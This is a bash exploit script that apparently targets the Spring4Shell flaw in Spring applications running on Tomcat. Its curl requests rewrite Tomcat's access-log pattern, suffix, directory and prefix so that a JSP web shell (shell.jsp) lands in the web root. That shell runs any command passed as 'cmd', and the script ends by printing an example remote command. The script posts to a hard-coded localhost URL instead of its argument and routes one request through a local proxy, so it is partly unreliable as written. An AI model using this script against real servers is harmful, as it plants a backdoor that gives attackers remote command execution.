#!/bin/bash

# Author: @jakabakos
# Based off the work of @Rezn0K and @devengpk

# ./exploit-with-curl.sh --url http://localhost/spring4shell/hello --dir spring4shell

URL='http://localhost/spring4shell/hello'

run_exploit() {
    local url=$1
    local dir=$2

    # REQUEST #1
    echo "[*] Resetting log variables."

    # The fileDateFormat field can be set and unset to enable numerous executions of the exploit.
    # Re-running the exploit will result in the creation of an artefact called "old_file_name_.jsp."
    RESP_CODE=$(curl -s --write-out '%{http_code}' -k --output /dev/null -X POST \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-binary 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_' \
        $URL)

    echo "[*] Response code: " $RESP_CODE

    # REQUEST #2
    echo "[*] Changing the TomCat log location variables"
    log_syntax="class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20"
    log_syntax+="java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter"
    log_syntax+="(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"
    log_syntax+="%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix="class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_directory="class.module.classLoader.resources.context.parent.pipeline.first.directory=${dir}"
    log_file_prefix="class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
    log_file_date_format="class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    change_vars_data="${log_syntax}&${log_file_suffix}&${log_file_directory}&${log_file_prefix}&${log_file_date_format}"

    RESP_CODE=$(curl -s --write-out '%{http_code}' -k --output /dev/null -X POST \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-binary ${change_vars_data} \
        $URL -x 127.0.0.1:8080)

    echo "[*] Response code: " $RESP_CODE

    # Tomcat takes some time to populate changes.
    sleep 3

    # REQUEST #3
    echo "[*] Sending the web shell-writing packet"

    RESP_CODE=$(curl -s --write-out '%{http_code}' -k --output /dev/null -k \
        -H 'prefix: <%' -H 'suffix: %>//' -H 'c: Runtime' \
        $URL)

    echo "[*] Response code: " $RESP_CODE

    sleep 1

    # REQUEST #4
    echo "[*] Resetting log variables to prevent future writes into the file."

    RESP_CODE=$(curl -s --write-out '%{http_code}' -k --output /dev/null -X 'POST' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-binary 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=' \
        $URL)

    echo "[*] Response code: " $RESP_CODE
}

main() {
    local url="${1%/*}"
    local dir="webapps/${2:-ROOT}"
    local filename=shell.jsp

    if [[ -z "$url" ]]; then
        echo "Must pass an option for --url."
        return 1
    fi

    echo "Running exploit..."
    run_exploit "$url" "$dir"

    echo ""
    echo "[+] Exploit completed."

    if [[ "$dir" == "webapps/ROOT" ]]; then
        location="${url%/*}/${filename}"
    else
        location="${url}/${filename}"
    fi

    echo "[+] Example remote command:"
    echo "    curl ${location}?cmd=id --output -"
}

# Parsing command-line argument
if [[ $# -lt 1 ]]; then
    echo "Usage: $0 --url <target_url> [--dir <directory>]"
    echo "Eg:    $0 --url http://localhost/spring4shell/hello --dir spring4shell"
    exit 1
fi

url=""
dir=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --url)
            url="$2"
            shift 2
            ;;
        --dir)
            dir="$2"
            shift 2
            ;;
        *)
            echo "Invalid option: $1"
            exit 1
            ;;
    esac
done

main "$url" "$dir"